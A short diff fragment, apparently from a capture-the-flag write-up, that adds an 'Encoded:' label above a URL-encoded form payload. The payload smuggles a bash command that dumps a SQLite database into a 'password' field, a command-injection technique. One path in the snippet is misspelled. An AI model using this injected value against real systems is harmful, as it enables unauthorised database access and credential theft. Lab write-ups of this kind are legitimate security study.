@@ -71,6 +71,7 @@ $db = new SQLite3('../nocturnal_databases/nocturnal_database.db');
 ```shell
 bash -c "sqlite3 /var/www/nocturnal_dabase/nocturnal_database.db .dump"
 ```
+- Encoded:
 ```UTF-8
 password=%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A&backup=
 ```
